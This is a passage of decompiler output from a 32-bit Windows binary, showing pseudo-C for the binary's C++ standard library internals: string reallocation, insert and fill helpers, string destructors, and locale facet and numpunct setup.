      v9 = 0x7FFFFFFF;
    }
  }
  else
  {
    v9 = 0x7FFFFFFF;
  }
  v10 = __CFADD__(v9, 1) ? -1 : v9 + 1;
  if ( v10 < 0x1000 )
  {
    if ( v10 )
    {
      v14 = operator new(__CFADD__(v9, 1) ? -1 : v9 + 1);
      v7 = v20;
      v13 = v14;
    }
    else
    {
      v13 = 0;
    }
  }
  else
  {
    v11 = v10 + 35;
    if ( v10 + 35 <= v10 )
      v11 = -1;
    v12 = operator new(v11);
    if ( !v12 )
      goto LABEL_23;
    v7 = v20;
    v13 = (_DWORD *)(((unsigned int)v12 + 35) & 0xFFFFFFE0);
    *(v13 - 1) = v12;
  }
  Src[4] = v18;
  Src[5] = (const void *)v9;
  v21 = v7 - Size + 1;
  v19 = (char *)v13 + Size + a6;
  if ( v17 >= 0x10 )
  {
    v15 = (char *)*Src;
    memmove(v13, *Src, Size);
    memmove((char *)v13 + Size, a5, a6);
    memmove(v19, &v15[Size], v21);
    if ( v17 + 1 < 0x1000 )
    {
LABEL_20:
      sub_46C87D(v15);
      *Src = v13;
      return Src;
    }
    if ( (unsigned int)&v15[-*((_DWORD *)v15 - 1) - 4] <= 0x1F )
    {
      v15 = (char *)*((_DWORD *)v15 - 1);
      goto LABEL_20;
    }
LABEL_23:
    _invalid_parameter_noinfo_noreturn();
  }
  memmove(v13, Src, Size);
  memmove((char *)v13 + Size, a5, a6);
  memmove(v19, (char *)Src + Size, v21);
  *Src = v13;
  return Src;
}
// 4257D0: using guessed type void __noreturn sub_4257D0(void);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (00424E00) --------------------------------------------------------
void **__thiscall sub_424E00(void **Src, unsigned int a2, int a3, size_t a4, char a5)
{
  size_t v6; // edx
  unsigned int v7; // esi
  unsigned int v8; // edi
  unsigned int v9; // ecx
  size_t v10; // eax
  void *v11; // eax
  _DWORD *v12; // esi
  _DWORD *v13; // eax
  char *v14; // edi
  void *v15; // edi
  void **result; // eax
  char *v17; // [esp+Ch] [ebp-10h]
  unsigned int v18; // [esp+10h] [ebp-Ch]
  size_t v19; // [esp+14h] [ebp-8h]
  _BYTE *v20; // [esp+14h] [ebp-8h]
  size_t Size; // [esp+18h] [ebp-4h]

  v6 = (size_t)Src[4];
  Size = v6;
  if ( 0x7FFFFFFF - v6 < a2 )
    sub_4257D0();
  v7 = (unsigned int)Src[5];
  v19 = v6 + a2;
  v8 = (v6 + a2) | 0xF;
  v18 = v7;
  if ( v8 <= 0x7FFFFFFF )
  {
    if ( v7 <= 0x7FFFFFFF - (v7 >> 1) )
    {
      if ( v8 < v7 + (v7 >> 1) )
        v8 = v7 + (v7 >> 1);
    }
    else
    {
      v8 = 0x7FFFFFFF;
    }
  }
  else
  {
    v8 = 0x7FFFFFFF;
  }
  v9 = __CFADD__(v8, 1) ? -1 : v8 + 1;
  if ( v9 < 0x1000 )
  {
    if ( v9 )
    {
      v13 = operator new(__CFADD__(v8, 1) ? -1 : v8 + 1);
      v6 = Size;
      v12 = v13;
    }
    else
    {
      v12 = 0;
    }
  }
  else
  {
    v10 = v9 + 35;
    if ( v9 + 35 <= v9 )
      v10 = -1;
    v11 = operator new(v10);
    if ( !v11 )
      goto LABEL_23;
    v6 = Size;
    v12 = (_DWORD *)(((unsigned int)v11 + 35) & 0xFFFFFFE0);
    *(v12 - 1) = v11;
  }
  Src[4] = (void *)v19;
  Src[5] = (void *)v8;
  v14 = (char *)v12 + v6;
  v17 = (char *)v12 + v6;
  v20 = (char *)v12 + v6 + a4;
  if ( v18 >= 0x10 )
  {
    v15 = *Src;
    memmove(v12, *Src, v6);
    memset(v17, a5, a4);
    *v20 = 0;
    if ( v18 + 1 < 0x1000 )
    {
LABEL_20:
      sub_46C87D(v15);
      *Src = v12;
      return Src;
    }
    if ( (unsigned int)v15 - *((_DWORD *)v15 - 1) - 4 <= 0x1F )
    {
      v15 = (void *)*((_DWORD *)v15 - 1);
      goto LABEL_20;
    }
LABEL_23:
    _invalid_parameter_noinfo_noreturn();
  }
  memmove(v12, Src, v6);
  memset(v14, a5, a4);
  *v20 = 0;
  result = Src;
  *Src = v12;
  return result;
}
// 4257D0: using guessed type void __noreturn sub_4257D0(void);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (00424F60) --------------------------------------------------------
void **__thiscall sub_424F60(void **Src, unsigned int a2, int a3, const void *a4, size_t a5)
{
  size_t v6; // edx
  unsigned int v7; // esi
  unsigned int v8; // edi
  unsigned int v9; // ecx
  size_t v10; // eax
  void *v11; // eax
  _DWORD *v12; // esi
  _DWORD *v13; // eax
  char *v14; // edi
  void *v15; // edi
  void **result; // eax
  unsigned int v17; // [esp+10h] [ebp-Ch]
  void *v18; // [esp+14h] [ebp-8h]
  char *v19; // [esp+14h] [ebp-8h]
  size_t Size; // [esp+18h] [ebp-4h]
  _BYTE *Sizea; // [esp+18h] [ebp-4h]

  v6 = (size_t)Src[4];
  Size = v6;
  if ( 0x7FFFFFFF - v6 < a2 )
    sub_4257D0();
  v7 = (unsigned int)Src[5];
  v18 = (void *)(v6 + a2);
  v8 = (v6 + a2) | 0xF;
  v17 = v7;
  if ( v8 <= 0x7FFFFFFF )
  {
    if ( v7 <= 0x7FFFFFFF - (v7 >> 1) )
    {
      if ( v8 < v7 + (v7 >> 1) )
        v8 = v7 + (v7 >> 1);
    }
    else
    {
      v8 = 0x7FFFFFFF;
    }
  }
  else
  {
    v8 = 0x7FFFFFFF;
  }
  v9 = __CFADD__(v8, 1) ? -1 : v8 + 1;
  if ( v9 < 0x1000 )
  {
    if ( v9 )
    {
      v13 = operator new(__CFADD__(v8, 1) ? -1 : v8 + 1);
      v6 = Size;
      v12 = v13;
    }
    else
    {
      v12 = 0;
    }
  }
  else
  {
    v10 = v9 + 35;
    if ( v9 + 35 <= v9 )
      v10 = -1;
    v11 = operator new(v10);
    if ( !v11 )
      goto LABEL_23;
    v6 = Size;
    v12 = (_DWORD *)(((unsigned int)v11 + 35) & 0xFFFFFFE0);
    *(v12 - 1) = v11;
  }
  Src[4] = v18;
  Src[5] = (void *)v8;
  v14 = (char *)v12 + v6;
  v19 = (char *)v12 + v6;
  Sizea = (char *)v12 + v6 + a5;
  if ( v17 >= 0x10 )
  {
    v15 = *Src;
    memmove(v12, *Src, v6);
    memmove(v19, a4, a5);
    *Sizea = 0;
    if ( v17 + 1 < 0x1000 )
    {
LABEL_20:
      sub_46C87D(v15);
      *Src = v12;
      return Src;
    }
    if ( (unsigned int)v15 - *((_DWORD *)v15 - 1) - 4 <= 0x1F )
    {
      v15 = (void *)*((_DWORD *)v15 - 1);
      goto LABEL_20;
    }
LABEL_23:
    _invalid_parameter_noinfo_noreturn();
  }
  memmove(v12, Src, v6);
  memmove(v14, a4, a5);
  *Sizea = 0;
  result = Src;
  *Src = v12;
  return result;
}
// 4257D0: using guessed type void __noreturn sub_4257D0(void);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (004250C0) --------------------------------------------------------
void __fastcall sub_4250C0(int a1, int a2)
{
  int i; // esi
  unsigned int v4; // ecx
  _DWORD *v5; // eax

  for ( i = a1; i != a2; i += 24 )
  {
    v4 = *(_DWORD *)(i + 20);
    if ( v4 >= 0x10 )
    {
      v5 = *(_DWORD **)i;
      if ( v4 + 1 >= 0x1000 )
      {
        if ( (unsigned int)v5 - *(v5 - 1) - 4 > 0x1F )
          _invalid_parameter_noinfo_noreturn();
        v5 = (_DWORD *)*(v5 - 1);
      }
      sub_46C87D(v5);
    }
    *(_DWORD *)(i + 16) = 0;
    *(_DWORD *)(i + 20) = 15;
    *(_BYTE *)i = 0;
  }
}

//----- (00425130) --------------------------------------------------------
void __fastcall sub_425130(int a1, int a2)
{
  int i; // esi
  unsigned int v4; // ecx
  _DWORD *v5; // eax

  for ( i = a1; i != a2; i += 24 )
  {
    v4 = *(_DWORD *)(i + 20);
    if ( v4 >= 8 )
    {
      v5 = *(_DWORD **)i;
      if ( 2 * v4 + 2 >= 0x1000 )
      {
        if ( (unsigned int)v5 - *(v5 - 1) - 4 > 0x1F )
          _invalid_parameter_noinfo_noreturn();
        v5 = (_DWORD *)*(v5 - 1);
      }
      sub_46C87D(v5);
    }
    *(_DWORD *)(i + 16) = 0;
    *(_DWORD *)(i + 20) = 7;
    *(_WORD *)i = 0;
  }
}

//----- (004251A0) --------------------------------------------------------
char *__usercall sub_4251A0@<eax>(int a1@<ebp>, int a2)
{
  unsigned int v2; // edi
  int v3; // ecx
  char *v4; // esi
  int v5; // eax
  int v6; // ecx
  const char *v7; // eax
  _Cvtvec v9; // [esp-A0h] [ebp-ACh] BYREF
  _BYTE v10[52]; // [esp-6Ch] [ebp-78h] BYREF
  _Ctypevec v11; // [esp-38h] [ebp-44h] BYREF
  int v12; // [esp-28h] [ebp-34h]
  int v13; // [esp-24h] [ebp-30h]
  int v14; // [esp-20h] [ebp-2Ch]
  int v15; // [esp-1Ch] [ebp-28h] BYREF
  _DWORD v16[5]; // [esp-18h] [ebp-24h] BYREF
  int v17; // [esp-4h] [ebp-10h]
  int v18; // [esp+0h] [ebp-Ch]
  int v19; // [esp+4h] [ebp-8h]
  int v20; // [esp+8h] [ebp-4h] BYREF
  int retaddr; // [esp+Ch] [ebp+0h]

  v18 = a1;
  v19 = retaddr;
  v17 = -1;
  v16[4] = &loc_4B1378;
  v16[3] = NtCurrentTeb()->NtTib.ExceptionList;
  v16[2] = &v20;
  v12 = a2;
  v14 = 0;
  std::_Lockit::_Lockit((std::_Lockit *)&v15, 0);
  v17 = 0;
  v2 = dword_4F034C;
  v13 = dword_4F1520;
  if ( !dword_4F034C )
  {
    std::_Lockit::_Lockit((std::_Lockit *)v16, 0);
    LOBYTE(v17) = 1;
    if ( !dword_4F034C )
      dword_4F034C = ++dword_4F0338;
    LOBYTE(v17) = 0;
    std::_Lockit::~_Lockit((std::_Lockit *)v16);
    v2 = dword_4F034C;
  }
  v3 = *(_DWORD *)(a2 + 4);
  if ( v2 >= *(_DWORD *)(v3 + 12) )
  {
    v4 = 0;
  }
  else
  {
    v4 = *(char **)(*(_DWORD *)(v3 + 8) + 4 * v2);
    if ( v4 )
      goto LABEL_20;
  }
  if ( !*(_BYTE *)(v3 + 20) )
    goto LABEL_12;
  v5 = sub_469E47();
  if ( v2 < *(_DWORD *)(v5 + 12) )
  {
    v4 = *(char **)(*(_DWORD *)(v5 + 8) + 4 * v2);
LABEL_12:
    if ( v4 )
      goto LABEL_20;
  }
  if ( v13 )
  {
    v4 = (char *)v13;
  }
  else
  {
    v4 = (char *)operator new(0x44u);
    v13 = (int)v4;
    LOBYTE(v17) = 2;
    v6 = *(_DWORD *)(v12 + 4);
    if ( v6 )
    {
      v7 = *(const char **)(v6 + 24);
      if ( !v7 )
        v7 = (const char *)(v6 + 28);
    }
    else
    {
      v7 = (const char *)&unk_4CCC25;
    }
    sub_401AF0((int)v10, v7);
    v14 = 1;
    *(_DWORD *)v4 = &std::_Facet_base::`vftable';
    *(_DWORD *)v4 = &std::locale::facet::`vftable';
    *((_DWORD *)v4 + 1) = 0;
    *(_DWORD *)v4 = &std::ctype_base::`vftable';
    v17 = 6;
    *(_DWORD *)v4 = &std::ctype<wchar_t>::`vftable';
    *(_Ctypevec *)(v4 + 8) = *_Getctype(&v11);
    *(_Cvtvec *)(v4 + 24) = *_Getcvt(&v9);
    v17 = 0;
    v14 = 0;
    sub_401BC0((int)v10);
    v16[0] = v4;
    LOBYTE(v17) = 8;
    std::_Facet_Register((struct std::_Facet_base *)v4);
    (*(void (__thiscall **)(char *))(*(_DWORD *)v4 + 4))(v4);
    dword_4F1520 = (int)v4;
    v16[0] = 0;
    LOBYTE(v17) = 0;
  }
LABEL_20:
  v17 = -1;
  std::_Lockit::~_Lockit((std::_Lockit *)&v15);
  return v4;
}
// 4251A0: could not find valid save-restore pair for ebp
// 469AB6: using guessed type _DWORD __thiscall std::_Lockit::_Lockit(std::_Lockit *__hidden this, _DWORD);
// 469B0E: using guessed type void __thiscall std::_Lockit::~_Lockit(std::_Lockit *__hidden this);
// 469E1B: using guessed type void __cdecl std::_Facet_Register(struct std::_Facet_base *);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4B8420: using guessed type void *std::_Facet_base::`vftable';
// 4B8430: using guessed type void *std::locale::facet::`vftable';
// 4B8440: using guessed type void *std::ctype_base::`vftable';
// 4BD318: using guessed type void *std::ctype<wchar_t>::`vftable';
// 4F0338: using guessed type int dword_4F0338;
// 4F034C: using guessed type int dword_4F034C;
// 4F1520: using guessed type int dword_4F1520;

//----- (004253C0) --------------------------------------------------------
_DWORD *__thiscall sub_4253C0(_DWORD *Src, unsigned int a2, int a3, int a4, unsigned int a5, unsigned __int16 a6)
{
  int v7; // ecx
  int v8; // eax
  unsigned int v9; // ecx
  unsigned int v10; // edi
  unsigned int v11; // ecx
  unsigned int v12; // edx
  size_t v13; // eax
  void *v14; // eax
  _DWORD *v15; // esi
  int v16; // edi
  char *v17; // ebx
  char *v18; // edi
  int i; // ecx
  _DWORD *result; // eax
  char *v21; // edi
  int j; // ecx
  size_t v23; // [esp-4h] [ebp-20h]
  int v25; // [esp+10h] [ebp-Ch]
  unsigned int v26; // [esp+14h] [ebp-8h]
  int v27; // [esp+18h] [ebp-4h]
  char *v28; // [esp+18h] [ebp-4h]

  v7 = Src[4];
  v25 = v7;
  if ( 2147483646 - v7 < a2 )
    sub_4257D0();
  v8 = v7 + a2;
  v9 = Src[5];
  v27 = v8;
  v10 = v8 | 7;
  v26 = v9;
  if ( (v8 | 7u) <= 0x7FFFFFFE )
  {
    if ( v9 <= 2147483646 - (v9 >> 1) )
    {
      if ( v10 < v9 + (v9 >> 1) )
        v10 = v9 + (v9 >> 1);
    }
    else
    {
      v10 = 2147483646;
    }
  }
  else
  {
    v10 = 2147483646;
  }
  v11 = __CFADD__(v10, 1) ? -1 : v10 + 1;
  v12 = 2 * v11;
  if ( v11 <= 0x7FFFFFFF )
  {
    if ( v12 < 0x1000 )
    {
      if ( v12 )
        v15 = operator new(2 * v11);
      else
        v15 = 0;
      goto LABEL_18;
    }
  }
  else
  {
    v12 = -1;
  }
  v13 = v12 + 35;
  if ( v12 + 35 <= v12 )
    v13 = -1;
  v14 = operator new(v13);
  if ( !v14 )
    goto LABEL_35;
  v15 = (_DWORD *)(((unsigned int)v14 + 35) & 0xFFFFFFE0);
  *(v15 - 1) = v14;
LABEL_18:
  Src[5] = v10;
  v16 = a4;
  Src[4] = v27;
  v28 = (char *)v15 + 2 * a4;
  v23 = 2 * a4;
  if ( v26 >= 8 )
  {
    v17 = (char *)*Src;
    memmove(v15, v17, v23);
    if ( a5 )
    {
      memset32(v28, (a6 << 16) | a6, a5 >> 1);
      v18 = &v28[4 * (a5 >> 1)];
      for ( i = a5 & 1; i; --i )
      {
        *(_WORD *)v18 = a6;
        v18 += 2;
      }
      v16 = a4;
    }
    memmove((char *)v15 + 2 * v16 + 2 * a5, &v17[2 * v16], 2 * (v25 - v16) + 2);
    if ( 2 * v26 + 2 < 0x1000 )
      goto LABEL_27;
    if ( (unsigned int)&v17[-*((_DWORD *)v17 - 1) - 4] <= 0x1F )
    {
      v17 = (char *)*((_DWORD *)v17 - 1);
LABEL_27:
      sub_46C87D(v17);
      result = Src;
      *Src = v15;
      return result;
    }
LABEL_35:
    _invalid_parameter_noinfo_noreturn();
  }
  memmove(v15, Src, v23);
  if ( a5 )
  {
    memset32(v28, (a6 << 16) | a6, a5 >> 1);
    v21 = &v28[4 * (a5 >> 1)];
    for ( j = a5 & 1; j; --j )
    {
      *(_WORD *)v21 = a6;
      v21 += 2;
    }
    v16 = a4;
  }
  memmove((char *)v15 + 2 * v16 + 2 * a5, (char *)Src + 2 * v16, 2 * (v25 - v16) + 2);
  *Src = v15;
  return Src;
}
// 4257D0: using guessed type void __noreturn sub_4257D0(void);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (004255A0) --------------------------------------------------------
char *__thiscall sub_4255A0(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &std::bad_cast::`vftable';
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8414: using guessed type void *std::bad_cast::`vftable';

//----- (00425620) --------------------------------------------------------
void __thiscall sub_425620(_DWORD *this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax
  unsigned int v4; // ecx
  void *v5; // eax

  v2 = this[11];
  if ( v2 >= 0x10 )
  {
    v3 = (_DWORD *)this[6];
    if ( v2 + 1 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        goto LABEL_12;
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_46C87D(v3);
  }
  this[10] = 0;
  this[11] = 15;
  *((_BYTE *)this + 24) = 0;
  v4 = this[5];
  if ( v4 >= 0x10 )
  {
    v5 = (void *)*this;
    if ( v4 + 1 < 0x1000 )
    {
LABEL_10:
      sub_46C87D(v5);
      goto LABEL_11;
    }
    if ( (unsigned int)v5 - *((_DWORD *)v5 - 1) - 4 <= 0x1F )
    {
      v5 = (void *)*((_DWORD *)v5 - 1);
      goto LABEL_10;
    }
LABEL_12:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_11:
  this[4] = 0;
  this[5] = 15;
  *(_BYTE *)this = 0;
}

//----- (00425700) --------------------------------------------------------
void __thiscall sub_425700(_DWORD *this)
{
  _DWORD *v1; // esi

  v1 = (_DWORD *)*this;
  if ( *this )
  {
    sub_425A10(v1);
    sub_46C87D(v1);
  }
}

//----- (00425760) --------------------------------------------------------
void __thiscall sub_425760(_DWORD *this)
{
  _DWORD *v1; // esi

  v1 = (_DWORD *)*this;
  if ( *this )
  {
    sub_425AC0(v1);
    sub_46C87D(v1);
  }
}

//----- (004257D0) --------------------------------------------------------
void __noreturn sub_4257D0()
{
  sub_46A183((int)"string too long");
}
// 4257D0: using guessed type void __noreturn sub_4257D0();

//----- (004257E0) --------------------------------------------------------
int *__thiscall sub_4257E0(int *this, unsigned __int8 a2)
{
  int v3; // edi
  int v4; // ecx
  int v5; // ecx
  int v6; // eax
  int *v7; // ecx
  int v8; // eax
  _BYTE *v9; // ecx
  char v10; // al
  int v11; // ecx
  _DWORD v13[6]; // [esp+0h] [ebp-34h] BYREF
  bool v14; // [esp+18h] [ebp-1Ch]
  int v15; // [esp+1Ch] [ebp-18h]
  int *v16; // [esp+20h] [ebp-14h]
  _DWORD *v17; // [esp+24h] [ebp-10h]
  int v18; // [esp+30h] [ebp-4h]

  v17 = v13;
  v16 = this;
  v3 = 0;
  v15 = 0;
  v13[5] = this;
  v4 = *(int *)((char *)this + *(_DWORD *)(*this + 4) + 56);
  if ( v4 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v4 + 4))(v4);
  v18 = 0;
  v5 = *(_DWORD *)(*this + 4);
  v6 = *this;
  if ( !*(int *)((char *)this + v5 + 12) )
  {
    v7 = *(int **)((char *)this + v5 + 60);
    if ( v7 )
    {
      if ( v7 != this )
      {
        sub_4212B0(v7);
        v6 = *this;
      }
    }
  }
  v8 = *(int *)((char *)this + *(_DWORD *)(v6 + 4) + 12);
  v14 = v8 == 0;
  v18 = 1;
  if ( v8 )
  {
    LOBYTE(v3) = 4;
  }
  else
  {
    LOBYTE(v18) = 2;
    if ( sub_425930(*(_DWORD ***)((char *)this + *(_DWORD *)(*this + 4) + 56), a2) == -1 )
      v3 = 4;
    v15 = v3;
    v18 = 1;
  }
  v9 = (char *)this + *(_DWORD *)(*this + 4);
  v10 = v3 | v9[12] | 4;
  if ( *((_DWORD *)v9 + 14) )
    v10 = v3 | v9[12];
  sub_4036A0(v9, v10, 0);
  v18 = 4;
  if ( !(unsigned __int8)j____uncaught_exception() )
    sub_421050(this);
  v18 = -1;
  v11 = *(int *)((char *)this + *(_DWORD *)(*this + 4) + 56);
  if ( v11 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v11 + 8))(v11);
  return this;
}
// 46A06B: using guessed type int j____uncaught_exception(void);

//----- (00425930) --------------------------------------------------------
int __thiscall sub_425930(_DWORD **this, unsigned __int8 a2)
{
  int *v2; // edx
  _DWORD *v3; // ecx
  unsigned __int8 *v4; // edx

  if ( !*this[8] )
    return ((int (__thiscall *)(_DWORD **, _DWORD))(*this)[3])(this, a2);
  v2 = this[12];
  if ( *v2 <= 0 )
    return ((int (__thiscall *)(_DWORD **, _DWORD))(*this)[3])(this, a2);
  --*v2;
  v3 = this[8];
  v4 = (unsigned __int8 *)(*v3)++;
  *v4 = a2;
  return a2;
}

//----- (00425970) --------------------------------------------------------
int __thiscall sub_425970(_DWORD *this)
{
  return sub_425A10(this);
}

//----- (004259C0) --------------------------------------------------------
int __thiscall sub_4259C0(_DWORD *this)
{
  return sub_425AC0(this);
}

//----- (00425A10) --------------------------------------------------------
int __thiscall sub_425A10(_DWORD *this)
{
  _DWORD *v2; // esi
  unsigned int v3; // ecx
  _DWORD *v4; // eax

  v2 = this + 24;
  v3 = this[29];
  if ( v3 >= 8 )
  {
    v4 = (_DWORD *)*v2;
    if ( 2 * v3 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v4 - *(v4 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v4 = (_DWORD *)*(v4 - 1);
    }
    sub_46C87D(v4);
  }
  v2[4] = 0;
  v2[5] = 7;
  *(_WORD *)v2 = 0;
  return sub_425B70(this);
}

//----- (00425AC0) --------------------------------------------------------
int __thiscall sub_425AC0(_DWORD *this)
{
  _DWORD *v2; // esi
  unsigned int v3; // ecx
  _DWORD *v4; // eax

  v2 = this + 25;
  v3 = this[30];
  if ( v3 >= 8 )
  {
    v4 = (_DWORD *)*v2;
    if ( 2 * v3 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v4 - *(v4 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v4 = (_DWORD *)*(v4 - 1);
    }
    sub_46C87D(v4);
  }
  v2[4] = 0;
  v2[5] = 7;
  *(_WORD *)v2 = 0;
  return sub_425C20(this);
}

//----- (00425B70) --------------------------------------------------------
int __thiscall sub_425B70(_DWORD *this)
{
  _DWORD *v2; // esi
  unsigned int v3; // ecx
  _DWORD *v4; // eax

  v2 = this + 18;
  v3 = this[23];
  if ( v3 >= 8 )
  {
    v4 = (_DWORD *)*v2;
    if ( 2 * v3 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v4 - *(v4 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v4 = (_DWORD *)*(v4 - 1);
    }
    sub_46C87D(v4);
  }
  v2[4] = 0;
  v2[5] = 7;
  *(_WORD *)v2 = 0;
  return sub_425CD0(this);
}

//----- (00425C20) --------------------------------------------------------
int __thiscall sub_425C20(_DWORD *this)
{
  _DWORD *v2; // esi
  unsigned int v3; // ecx
  _DWORD *v4; // eax

  v2 = this + 19;
  v3 = this[24];
  if ( v3 >= 0x10 )
  {
    v4 = (_DWORD *)*v2;
    if ( v3 + 1 >= 0x1000 )
    {
      if ( (unsigned int)v4 - *(v4 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v4 = (_DWORD *)*(v4 - 1);
    }
    sub_46C87D(v4);
  }
  v2[4] = 0;
  v2[5] = 15;
  *(_BYTE *)v2 = 0;
  return sub_425D80(this);
}

//----- (00425CD0) --------------------------------------------------------
int __thiscall sub_425CD0(_DWORD *this)
{
  _DWORD *v2; // esi
  unsigned int v3; // ecx
  _DWORD *v4; // eax

  v2 = this + 12;
  v3 = this[17];
  if ( v3 >= 8 )
  {
    v4 = (_DWORD *)*v2;
    if ( 2 * v3 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v4 - *(v4 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v4 = (_DWORD *)*(v4 - 1);
    }
    sub_46C87D(v4);
  }
  v2[4] = 0;
  v2[5] = 7;
  *(_WORD *)v2 = 0;
  return sub_425EC0(this);
}

//----- (00425D80) --------------------------------------------------------
int __thiscall sub_425D80(_DWORD *this)
{
  _DWORD *v2; // esi
  unsigned int v3; // ecx
  _DWORD *v4; // eax

  v2 = this + 13;
  v3 = this[18];
  if ( v3 >= 8 )
  {
    v4 = (_DWORD *)*v2;
    if ( 2 * v3 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v4 - *(v4 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v4 = (_DWORD *)*(v4 - 1);
    }
    sub_46C87D(v4);
  }
  v2[4] = 0;
  v2[5] = 7;
  *(_WORD *)v2 = 0;
  return sub_425EC0(this);
}

//----- (00425E30) --------------------------------------------------------
void __thiscall sub_425E30(_DWORD *this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax

  v2 = this[5];
  if ( v2 >= 0x10 )
  {
    v3 = (_DWORD *)*this;
    if ( v2 + 1 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_46C87D(v3);
  }
  this[4] = 0;
  this[5] = 15;
  *(_BYTE *)this = 0;
}

//----- (00425EC0) --------------------------------------------------------
int __thiscall sub_425EC0(_DWORD *this)
{
  char *v2; // edi
  unsigned int v3; // ecx
  _DWORD *v4; // eax
  unsigned int v5; // ecx
  void *v6; // eax
  int result; // eax

  v2 = (char *)(this + 6);
  v3 = this[11];
  if ( v3 >= 8 )
  {
    v4 = *(_DWORD **)v2;
    if ( 2 * v3 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v4 - *(v4 - 1) - 4 > 0x1F )
        goto LABEL_12;
      v4 = (_DWORD *)*(v4 - 1);
    }
    sub_46C87D(v4);
  }
  *((_DWORD *)v2 + 4) = 0;
  *((_DWORD *)v2 + 5) = 7;
  *(_WORD *)v2 = 0;
  v5 = this[5];
  if ( v5 >= 8 )
  {
    v6 = (void *)*this;
    if ( 2 * v5 + 2 < 0x1000 )
    {
LABEL_10:
      sub_46C87D(v6);
      goto LABEL_11;
    }
    if ( (unsigned int)v6 - *((_DWORD *)v6 - 1) - 4 <= 0x1F )
    {
      v6 = (void *)*((_DWORD *)v6 - 1);
      goto LABEL_10;
    }
LABEL_12:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_11:
  result = 0;
  this[4] = 0;
  this[5] = 7;
  *(_WORD *)this = 0;
  return result;
}

//----- (00425FC0) --------------------------------------------------------
int __thiscall sub_425FC0(_DWORD *this)
{
  return sub_425EC0(this);
}

//----- (00426010) --------------------------------------------------------
int __thiscall sub_426010(_DWORD *this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax
  int result; // eax

  v2 = this[5];
  if ( v2 >= 8 )
  {
    v3 = (_DWORD *)*this;
    if ( 2 * v2 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_46C87D(v3);
  }
  result = 0;
  this[4] = 0;
  this[5] = 7;
  *(_WORD *)this = 0;
  return result;
}

//----- (004260B0) --------------------------------------------------------
int __userpurge sub_4260B0@<eax>(int a1@<ecx>, int a2@<ebp>, int a3, char a4)
{
  struct lconv *v5; // edi
  const char *grouping; // eax
  int result; // eax
  int v8; // [esp-C8h] [ebp-D4h] BYREF
  _Cvtvec v9; // [esp-B8h] [ebp-C4h] BYREF
  _Cvtvec v10; // [esp-88h] [ebp-94h] BYREF
  _Cvtvec v11; // [esp-58h] [ebp-64h] BYREF
  mbstate_t v12; // [esp-2Ch] [ebp-38h] BYREF
  int v13; // [esp-24h] [ebp-30h] BYREF
  char v14[12]; // [esp-20h] [ebp-2Ch] BYREF
  int *v15; // [esp-14h] [ebp-20h]
  int *v16; // [esp-10h] [ebp-1Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-18h]
  void *v18; // [esp-8h] [ebp-14h]
  int v19; // [esp-4h] [ebp-10h]
  int v20; // [esp+0h] [ebp-Ch]
  int v21; // [esp+4h] [ebp-8h]
  int v22; // [esp+8h] [ebp-4h] BYREF
  int retaddr; // [esp+Ch] [ebp+0h]

  v20 = a2;
  v21 = retaddr;
  v19 = -1;
  v18 = &loc_4B1760;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  v15 = &v22;
  v16 = &v8;
  v13 = a1;
  v5 = localeconv();
  v11 = *_Getcvt(&v10);
  *(_DWORD *)(a1 + 8) = 0;
  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 20) = 0;
  v19 = 0;
  v10 = *_Getcvt(&v9);
  grouping = byte_4CCC25;
  if ( !a4 )
    grouping = v5->grouping;
  *(_DWORD *)(a1 + 8) = sub_4270A0(grouping);
  *(_DWORD *)(a1 + 16) = sub_401EC0("false", 0, &v11);
  *(_DWORD *)(a1 + 20) = sub_401EC0("true", 0, &v11);
  v19 = -1;
  if ( a4 )
  {
    v14[0] = 46;
    v13 = 0;
    v12 = 0i64;
    _Mbrtowc((wchar_t *)&v13, v14, 1u, &v12, &v11);
    *(_WORD *)(a1 + 12) = v13;
    v14[0] = 44;
    v13 = 0;
    v12 = 0i64;
    _Mbrtowc((wchar_t *)&v13, v14, 1u, &v12, &v11);
    result = (unsigned __int16)v13;
  }
  else
  {
    *(_WORD *)(a1 + 12) = *v5->_W_decimal_point;
    result = *v5->_W_thousands_sep;
  }
